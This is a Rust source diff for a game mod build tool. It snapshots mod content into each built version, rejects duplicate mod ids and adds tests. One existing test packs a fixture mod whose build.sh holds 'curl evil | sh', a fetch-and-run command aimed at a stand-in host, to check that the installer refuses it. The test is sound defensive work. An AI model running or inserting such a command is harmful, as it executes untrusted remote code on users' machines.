@@ -386,10 +386,61 @@ fn save_record(target: Target, profile: Profile, platform: Option<&str>, record:
     }
 }
 
+/// The root of an unpacked combined mod, or the mixin folder for code-only mods.
+fn bundle_root(bundle: &Bundle) -> &Path {
+    bundle
+        .dir
+        .parent()
+        .and_then(Path::parent)
+        .filter(|root| {
+            root.join(NATIVE_MANIFEST).is_file()
+                && bundle.dir == root.join("mixins").join(&bundle.id)
+        })
+        .unwrap_or(&bundle.dir)
+}
+
+fn content_files(bundle: &Bundle) -> Result<Vec<(String, PathBuf)>, String> {
+    let root = bundle_root(bundle);
+    if !root.join(horizon_mods::manifest::MANIFEST).is_file() {
+        return Ok(Vec::new());
+    }
+    let package = horizon_mods::Package::read(root)?;
+    if package.manifest.id != bundle.id {
+        return Err(tr("Native and content mod ids differ.").into());
+    }
+    let content = horizon_mods::Content::read(root, &package.manifest)?;
+    Ok(std::iter::once(horizon_mods::manifest::MANIFEST.to_owned())
+        .chain(content.files)
+        .map(|name| {
+            let path = root.join(&name);
+            (name, path)
+        })
+        .collect())
+}
+
+fn build_files(bundle: &Bundle) -> Result<Vec<(String, PathBuf)>, String> {
+    let mut files = bundle_files(bundle)?;
+    files.extend(content_files(bundle)?);
+    files.sort_by(|a, b| a.0.cmp(&b.0));
+    Ok(files)
+}
+
+/// Content is owned by this exact build, never read from a later installed mod update.
+fn install_content(mods: &[Bundle], version: &Path) -> Result<(), String> {
+    for bundle in mods {
+        for (name, path) in content_files(bundle)? {
+            let to = version.join("native-content").join(&bundle.id).join(name);
+            fs::create_dir_all(to.parent().unwrap()).map_err(|e| e.to_string())?;
+            fs::copy(path, to).map_err(|e| e.to_string())?;
+        }
+    }
+    Ok(())
+}
+
 /// The hash of a bundle's files.
 fn mod_hash(b: &Bundle) -> Result<String, String> {
     let mut hash = Sha256::new();
-    for (name, path) in bundle_files(b)? {
+    for (name, path) in build_files(b)? {
         let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
         hash.update(name.as_bytes());
         hash.update((bytes.len() as u64).to_le_bytes());
@@ -613,22 +664,32 @@ pub const INSTALLED: &str = "horizon-native-mods";
 /// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
 /// `mixins/<id>/`, plus files under its `data/`, nothing run).
 pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
-    let out = root().join("installed.incoming");
-    let _ = fs::remove_dir_all(&out);
+    installed_mods_into(home, &root().join("installed.incoming"))
+}
+
+fn installed_mods_into(home: &Path, out: &Path) -> Result<PathBuf, String> {
+    let _ = fs::remove_dir_all(out);
     let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
         .map(|dir| dir.flatten().map(|e| e.path()).collect())
         .unwrap_or_default();
-    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
+    paths.retain(|p| horizon_mods::index::native::is_file(p));
     paths.sort();
     let mut count = 0;
+    let mut seen = std::collections::BTreeSet::new();
     for path in paths {
         let bundle = horizon_mods::index::native::Bundle::read(&path)
             .map_err(|e| format!("{}: {e}", path.display()))?;
         if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
             continue;
         }
+        if !seen.insert(bundle.manifest.id.clone()) {
+            return Err(trf(
+                "Duplicate native mod {id}.",
+                &[("id", &bundle.manifest.id)],
+            ));
+        }
         let dir = out.join(&bundle.manifest.id);
-        for (name, bytes) in &bundle.files {
+        for (name, bytes) in bundle.source_files() {
             let to = dir.join(name);
             fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
             fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
@@ -641,7 +702,7 @@ pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
             home.join(INSTALLED).display()
         ));
     }
-    Ok(out)
+    Ok(out.to_path_buf())
 }
 
 /// A mixin bundle: a folder with a `horizon-mixin.toml`, and the revisions it pins.
@@ -1530,7 +1591,7 @@ pub fn version_for(
     for b in bundles {
         hash.update(b.id.as_bytes());
         hash.update([0]);
-        for (name, path) in bundle_files(b)? {
+        for (name, path) in build_files(b)? {
             let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
             hash.update(name.as_bytes());
             hash.update((bytes.len() as u64).to_le_bytes());
@@ -2589,6 +2650,7 @@ fn pipeline(
             "left_out": left_out.iter().map(LeftOut::to_json).collect::<Vec<_>>(),
         });
         install(base, &version, target, &binary, &about, |dir| {
+            install_content(&mods, dir)?;
             for (step, program) in &post {
                 progress(Step::PostBuild(step.mod_id.clone()));
                 let cmd = crates::post_build(program, step, dir, &real.join("cache"), &stage)?;
@@ -2928,10 +2990,15 @@ pub(crate) fn copy_base(from: &Path, to: &Path, target: Target) -> Result<(), St
 /// data behind. A server build is the headless engine: it keeps neither the game's own binary
 /// nor any `horizon-engine` the base shipped, which would run unmodded beside its own.
 fn carried_over(name: &std::ffi::OsStr, target: Target) -> bool {
-    let mut own: Vec<String> = ["Horizon.app", "native-mods.json", "native-data"]
-        .iter()
-        .map(|s| s.to_string())
-        .collect();
+    let mut own: Vec<String> = [
+        "Horizon.app",
+        "native-mods.json",
+        "native-data",
+        "native-content",
+    ]
+    .iter()
+    .map(|s| s.to_string())
+    .collect();
     own.push(backend::CLIENT.to_string());
     own.push(".installed".to_string());
     if target == Target::Server {
@@ -3057,6 +3124,7 @@ mod tests {
             ".installed",
             "native-mods.json",
             "native-data",
+            "native-content",
         ] {
             assert!(!carried_over(OsStr::new(own), Target::Client), "{own}");
         }
@@ -3585,6 +3653,62 @@ mod tests {
         );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
+    }
+
+    #[test]
+    fn combined_content_is_snapshotted_with_its_exact_native_build() {
+        let incoming = dir("combined-source");
+        write_native(&incoming, "veinminer", A, B);
+        fs::write(incoming.join("horizon-mod.toml"), "id=\"veinminer\"\nname=\"Sounds\"\nversion=\"0.3.0\"\napi=\"0.2\"\ncapabilities=[\"registries\"]\n").unwrap();
+        let sound = "assets/veinminer/sounds.json";
+        fs::create_dir_all(incoming.join("assets/veinminer")).unwrap();
+        fs::write(incoming.join(sound), b"{}").unwrap();
+        let home = dir("combined-install");
+        fs::create_dir_all(home.join(INSTALLED)).unwrap();
+        let archive = home.join(INSTALLED).join("veinminer.hmod");
+        let mut zip = zip::ZipWriter::new(fs::File::create(&archive).unwrap());
+        for (name, path) in files(&incoming).unwrap() {
+            zip.start_file(name, zip::write::SimpleFileOptions::default())
+                .unwrap();
+            zip.write_all(&fs::read(path).unwrap()).unwrap();
+        }
+        zip.finish().unwrap();
+        crate::browser::java::set_enabled(&home, "veinminer", true).unwrap();
+        let staged = dir("combined-staged");
+        installed_mods_into(&home, &staged).unwrap();
+        let mods = bundles(&staged).unwrap();
+        assert_eq!(
+            crate::native_status::enabled(&home)[0].2,
+            source_digest(&mods[0])
+        );
+        let before = version_for(A, B, Profile::Performance, Target::Client, None, &mods).unwrap();
+        let built = dir("combined-built");
+        install_content(&mods, &built).unwrap();
+        let snapshot = built.join("native-content/veinminer");
+        let package = horizon_mods::Package::read(&snapshot).unwrap();
+        let content = horizon_mods::Content::read(&snapshot, &package.manifest).unwrap();
+        assert_eq!(content.file(sound).unwrap(), b"{}");
+        fs::write(
+            staged.join("veinminer").join(sound),
+            b"{\"new\":{\"sounds\":[]}}",
+        )
+        .unwrap();
+        fs::write(&archive, b"a later downloaded version").unwrap();
+        assert_ne!(
+            before,
+            version_for(A, B, Profile::Performance, Target::Client, None, &mods).unwrap()
+        );
+        assert_eq!(
+            fs::read(snapshot.join(sound)).unwrap(),
+            b"{}",
+            "later installed updates cannot mutate a built version"
+        );
+        let rebuilt = dir("combined-rebuilt");
+        copy_base(&built, &rebuilt, Target::Client).unwrap();
+        assert!(
+            !rebuilt.join("native-content").exists(),
+            "disabled mods leave no content in the next build"
+        );
     }
 
     #[test]
